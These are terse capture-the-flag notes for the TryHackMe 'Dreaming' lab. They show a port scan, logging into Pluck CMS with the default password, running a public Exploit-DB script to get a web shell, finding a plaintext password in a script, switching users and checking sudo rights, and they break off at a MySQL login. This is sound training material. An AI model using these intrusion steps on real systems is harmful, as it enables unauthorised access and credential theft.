link: https://tryhackme.com/room/dreaming

<code>
└─$ nmap -sV -sC -Pn dreaming.thm        
Starting Nmap 7.92 ( https://nmap.org ) at 2024-01-12 04:22 CST
Nmap scan report for dreaming.thm (10.10.57.14)
Host is up (0.034s latency).
Not shown: 998 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.8 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 76:26:67:a6:b0:08:0e:ed:34:58:5b:4e:77:45:92:57 (RSA)
|   256 52:3a:ad:26:7f:6e:3f:23:f9:e4:ef:e8:5a:c8:42:5c (ECDSA)
|_  256 71:df:6e:81:f0:80:79:71:a8:da:2e:1e:56:c4:de:bb (ED25519)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-title: Apache2 Ubuntu Default Page: It works
|_http-server-header: Apache/2.4.41 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

 nmap, gobuster

http://dreaming.thm/app/pluck-4.7.13/?file=dreaming

whoops default admin password is password
http://dreaming.thm/app/pluck-4.7.13/admin.php?action=start

use known exploit to get reverse shell
https://www.exploit-db.com/exploits/49909
─$ python3 49909.py 10.10.57.14 80 password /app/pluck-4.7.13/



p0wny@shell:/home# ls -la
total 20
drwxr-xr-x  5 root     root     4096 Jul 28 22:26 .
drwxr-xr-x 20 root     root     4096 Jul 28 22:35 ..
drwxr-xr-x  4 death    death    4096 Aug 25 20:04 death
drwxr-xr-x  5 lucien   lucien   4096 Aug 25 16:26 lucien
drwxr-xr-x  3 morpheus morpheus 4096 Aug  7 23:48 morpheus


run linpeas found interesing files 
www-data@dreaming:/opt$ ls -la
ls -la
total 16
drwxr-xr-x  2 root   root   4096 Aug 15 12:45 .
drwxr-xr-x 20 root   root   4096 Jul 28 22:35 ..
-rwxrw-r--  1 death  death  1574 Aug 15 12:45 getDreams.py
-rwxr-xr-x  1 lucien lucien  483 Aug  7 23:36 test.py
www-data@dreaming:/opt$ cat test.py
cat test.py
import requests

#Todo add myself as a user
url = "http://127.0.0.1/app/pluck-4.7.13/login.php"
password = "HeyLucien#@1999!"

data = {
        "cont1":password,
        "bogus":"",
        "submit":"Log+in"
        }

req = requests.post(url,data=data)

if "Password correct." in req.text:
    print("Everything is in proper order. Status Code: " + str(req.status_code))
else:
    print("Something is wrong. Status Code: " + str(req.status_code))
    print("Results:\n" + req.text)
www-data@dreaming:/opt$ su lucien
su lucien
<b>Password: HeyLucien#@1999!</b>
id
uid=1000(lucien) gid=1000(lucien) groups=1000(lucien),4(adm),24(cdrom),30(dip),46(plugdev)

get Lucien password login via ssh

lucien@dreaming:/opt$ sudo -l
Matching Defaults entries for lucien on dreaming:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User lucien may run the following commands on dreaming:
    (death) NOPASSWD: /usr/bin/python3 /home/death/getDreams.py


lucien@dreaming:~$ mysql -u lucien -plucien42DBPASSWORD




<\code>
